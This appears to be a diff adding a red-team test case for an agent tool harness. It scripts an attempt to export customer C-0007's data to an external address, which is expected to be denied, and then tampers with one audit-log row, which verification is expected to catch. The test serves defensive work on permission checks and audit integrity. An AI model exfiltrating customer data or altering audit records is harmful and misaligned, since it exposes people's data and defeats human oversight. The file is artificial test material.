@@ -1,0 +1,19 @@
+id: RT-24
+suite: redteam
+category: audit
+title: One audit row is edited after the fact
+expected: verify fails at that sequence number
+steps:
+- call:
+    tool: lookup_customer
+    args:
+      customer_id: C-0007
+  expect:
+    status: OK
+- call:
+    tool: export_customer_data
+    args:
+      destination: collector@external.example
+  expect:
+    status: DENIED
+- tamper_audit: 4
